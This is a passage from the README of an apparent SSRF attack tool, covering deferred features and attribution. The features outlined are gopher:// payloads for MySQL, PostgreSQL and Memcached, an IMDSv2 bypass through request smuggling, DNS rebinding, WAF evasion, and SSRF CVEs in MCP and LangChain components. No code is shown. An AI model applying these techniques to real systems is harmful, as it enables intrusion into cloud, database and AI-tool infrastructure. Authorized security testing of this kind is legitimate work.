subcommand (e.g. `wraith shell`) fully decoupled from `wraith scan`, with a
mandatory out-of-band authorization token beyond the scope file, and audit
logging before it can land.

**Prerequisites:** a separate `wraith shell` subcommand; a mandatory
authorization token distinct from the scope file; a loopback-only CI fixture;
a mature audit-log feature.

### Deferred: Extended `gopher://` protocol weaponization

Gopherus (the reference) covers Redis, PHP-FPM FastCGI, MySQL, PostgreSQL,
Zabbix, and Memcached. wraith v0.2 ships Redis and FastCGI; the remaining
protocols are deferred:

- **MySQL** — authentication bypass via pre-auth RCE for older versions;
  gopher payload encodes the MySQL client protocol handshake.
- **PostgreSQL** — `COPY TO/FROM PROGRAM` for file read/write; gopher payload
  encodes the PostgreSQL FE/BE wire protocol.
- **Memcached** — cache poisoning or slot dump; gopher payload encodes the
  Memcached text protocol.

Each additional protocol extends the destructive surface and must be behind a
protocol-specific opt-in flag (e.g. `--exploit-mysql`) in addition to the
existing `--exploit` gate, with a named confirmation step describing the
specific action and its side effects.

**Prerequisites:** verified gopher payload encodings for each protocol
(reference Gopherus for byte structure); hermetic container test fixtures (a
local MySQL/Postgres/Memcached instance in the Tier-3 docker test suite).

### Deferred: Request-smuggling desync to reach enforced IMDSv2

AWS IMDSv2 enforcement can potentially be bypassed via HTTP request-smuggling
desync. This surface overlaps substantially with `doppelganger` (the
necromancer suite tool that owns request-smuggling as its core niche). This
item should not land until `doppelganger` stabilises its smuggling primitives;
wraith would call `doppelganger` as a library rather than re-implement.

### Deferred: Self-hosted DNS-rebinding orchestration

wraith emits `rbndr.us` rebind hostnames (emit-only). Hosting the DNS flip
locally eliminates third-party dependency and allows precise rebind timing, but
requires outbound DNS authority, rate-limiting against open-resolver abuse, and
documentation for operator-controlled domain registration.

### Deferred: Full CVE template library and advanced WAF evasion

The v0.1 MCP catalog seeds a handful of curated CVE signatures. Extending this
to a maintained multi-framework CVE library (Ivanti, GitLab Runner, Spring Boot
Actuator, Next.js, Grafana renderer) and adding WAF fingerprinting + per-vendor
advanced bypass catalog are deferred until a template schema (YAML/TOML with
version gates) and a `wraith update-templates` mechanism are designed.

## License

MIT &mdash; see [LICENSE](LICENSE).

## Attribution

wraith stands on the shoulders of prior SSRF work:

- **[SSRFmap](https://github.com/swisskyrepo/SSRFmap)** by Swissky &mdash; the
  dead-ancestor SSRF scanner; the source of the raw-request + injection-marker
  workflow and the bypass-pattern catalog wraith modernizes.
- **[Gopherus](https://github.com/tarunkant/Gopherus)** by Tarun Kant Gupta
  &mdash; the reference for `gopher://` RESP / FastCGI payload structure.
- **[interactsh](https://github.com/projectdiscovery/interactsh)** by
  ProjectDiscovery &mdash; the out-of-band interaction protocol wraith's OOB
  confirmation engine speaks.
- Cloud-metadata and MCP SSRF technique authors cited inline in
  [`RESEARCH.md`](RESEARCH.md) and against the specific CVEs in
  [`V0.1-CRITERIA.md`](V0.1-CRITERIA.md) (e.g. Typebot IMDSv2 header-injection
  CVE-2025-64709; Fetch MCP CVE-2025-65513; MCP-Atlassian CVE-2026-27826;
  LangChain `RecursiveUrlLoader` CVE-2026-26019 / -27795).

See NOTICE for details where applicable.
